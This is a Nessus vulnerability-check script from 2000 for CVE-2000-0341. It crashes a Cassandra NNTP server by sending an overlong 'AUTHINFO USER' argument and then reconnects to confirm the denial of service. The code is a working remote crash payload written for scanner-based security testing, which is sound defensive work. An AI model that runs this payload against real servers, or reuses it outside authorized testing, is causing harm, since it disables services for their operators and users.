#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10388);
 script_bugtraq_id(1156);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2000-0341");
 name["english"] = "Cassandra NNTP Server DoS";
 name["francais"] = "Déni de service contre le serveur de news Cassandra";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote NNTP server is subject to a buffer overflow
which allows an attacker to disable it remotely by
giving a too long argument to the 'AUTHINFO USER'
command.

Solution : contact your vendor for a fix
Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de désactiver le serveur
de news distant par un dépassement de buffer survenant
lorsqu'un argument trop long est donné à la commande
'AUTHINFO USER'.

Solution : contactez votre vendeur pour un patch
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote NNTP server";
 summary["francais"] = "Fait planter le serveur NNTP distant";
 
 script_summary(english:summary["english"], 
                francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 script_dependencie("find_service_3digits.nasl");
 script_require_ports("Services/nntp", 119);
 
 exit(0);
}

port = get_kb_item("Services/nntp");
if(!port)port = 119;

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = recv(socket:soc, length:8192);
  if("posting allowed" >< r)
  {
    s = string("AUTHINFO USER ", crap(10002), "\r\n");
    send(socket:soc, data:s);
    close(soc);

    soc2 = open_sock_tcp(port);
    r2 = recv(socket:soc2, length:1024);
    if(!r2)
    {
      security_hole(port);
    }
    close(soc2);
  }
}
